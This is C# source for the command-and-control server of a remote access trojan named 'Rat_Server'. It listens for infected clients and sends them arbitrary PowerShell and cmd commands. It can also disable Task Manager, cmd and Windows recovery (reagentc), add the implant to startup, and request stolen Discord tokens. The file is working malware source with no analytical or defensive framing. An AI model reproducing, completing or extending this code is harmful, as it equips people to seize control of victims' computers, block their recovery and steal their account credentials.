using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Rat_Server
{
    public partial class Form1 : Form
    {
        private TcpListener listener;
        private readonly object clientLock = new object();
        private readonly List<TcpClient> connectedClients = new List<TcpClient>();

        public Form1()
        {
            InitializeComponent();
            StartServer();
        }

        private void StartServer()
        {
            Task.Run(async () =>
            {
                listener = new TcpListener(IPAddress.Any, 6969);
                listener.Start();
                MessageBox.Show("Server started on port 6969...");

                while (true)
                {
                    TcpClient client = await listener.AcceptTcpClientAsync();
                    lock (clientLock)
                    {
                        connectedClients.Add(client);
                    }

                    MessageBox.Show($"Client connected: {client.Client.RemoteEndPoint}");
                    _ = HandleClientAsync(client);
                }
            });
        }

        private async Task HandleClientAsync(TcpClient client)
        {
            NetworkStream stream = client.GetStream();

            try
            {
                while (client.Connected)
                {
                    byte[] buffer = new byte[1024];
                    int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);

                    if (bytesRead > 0)
                    {
                        string message = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                        MessageBox.Show($"Received: {message}");
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error with client {client.Client.RemoteEndPoint}: {ex.Message}");
            }
            finally
            {
                lock (clientLock)
                {
                    connectedClients.Remove(client);
                }
                client.Close();
                MessageBox.Show($"Client disconnected: {client.Client.RemoteEndPoint}");
            }
        }

        private void OpenCommandInputDialog(string commandType)
        {
            using (var inputForm = new Form())
            {
                inputForm.Text = $"Enter {commandType} Command";
                inputForm.Size = new System.Drawing.Size(300, 150);

                Label lblCommand = new Label() { Left = 10, Top = 20, Text = $"Enter {commandType} Command:" };
                TextBox txtCommand = new TextBox() { Left = 10, Top = 50, Width = 250 };
                Button btnSubmit = new Button() { Left = 190, Top = 80, Text = "Submit" };

                btnSubmit.Click += (sender, e) =>
                {
                    string command = txtCommand.Text;
                    if (!string.IsNullOrEmpty(command))
                    {
                        foreach (var client in connectedClients)
                        {
                            SendCommand(client, $"{commandType}command|{command}");
                        }
                    }
                    inputForm.Close();
                };

                inputForm.Controls.Add(lblCommand);
                inputForm.Controls.Add(txtCommand);
                inputForm.Controls.Add(btnSubmit);
                inputForm.ShowDialog();
            }
        }

        private void SendCommand(TcpClient client, string command)
        {
            NetworkStream stream = client.GetStream();
            byte[] data = Encoding.ASCII.GetBytes(command + "|");
            stream.Write(data, 0, data.Length);
            stream.Flush();
        }

        private void PowershellCommand_Click(object sender, EventArgs e)
        {
            OpenCommandInputDialog("ps");
        }

        private void CmdCommand_Click(object sender, EventArgs e)
        {
            OpenCommandInputDialog("cmd");
        }

        private void ReagentcEnable_Click(object sender, EventArgs e)
        {
            foreach (var client in connectedClients)
            {
                SendCommand(client, "enable_reagentc|");
            }
            MessageBox.Show("Reagentc Enable command sent to all connected clients.");
        }

        private void ReagentcDisable_Click(object sender, EventArgs e)
        {
            foreach (var client in connectedClients)
            {
                SendCommand(client, "disable_reagentc|");
            }
            MessageBox.Show("Reagentc Disable command sent to all connected clients.");
        }

        private void EnableCmd_Click(object sender, EventArgs e)
        {
            foreach (var client in connectedClients)
            {
                SendCommand(client, "enable_cmd|");
            }
            MessageBox.Show("Enable CMD command sent to all connected clients.");
        }

        private void DisableCmd_Click(object sender, EventArgs e)
        {
            foreach (var client in connectedClients)
            {
                SendCommand(client, "disable_cmd|");
            }
            MessageBox.Show("Disable CMD command sent to all connected clients.");
        }

        private void EnableTaskManager_Click(object sender, EventArgs e)
        {
            foreach (var client in connectedClients)
            {
                SendCommand(client, "enable_taskmanager|");
            }
            MessageBox.Show("Enable Task Manager command sent to all connected clients.");
        }

        private void DisableTaskManager_Click(object sender, EventArgs e)
        {
            foreach (var client in connectedClients)
            {
                SendCommand(client, "disable_taskmanager|");
            }
            MessageBox.Show("Disable Task Manager command sent to all connected clients.");
        }

        private void AddToStartup_Click(object sender, EventArgs e)
        {
            foreach (var client in connectedClients)
            {
                SendCommand(client, "add_to_startup|");
            }
            MessageBox.Show("Add to Startup command sent to all connected clients.");
        }

        private void RemoveFromStartup_Click(object sender, EventArgs e)
        {
            foreach (var client in connectedClients)
            {
                SendCommand(client, "remove_from_startup|");
            }
            MessageBox.Show("Remove from Startup command sent to all connected clients.");
        }

        private void GetDiscordTokens_Click(object sender, EventArgs e)
        {
            foreach (var client in connectedClients)
            {
                SendCommand(client, "get_discord_tokens|");
            }
            MessageBox.Show("Requested Discord tokens from all connected clients.");
        }
    }
}
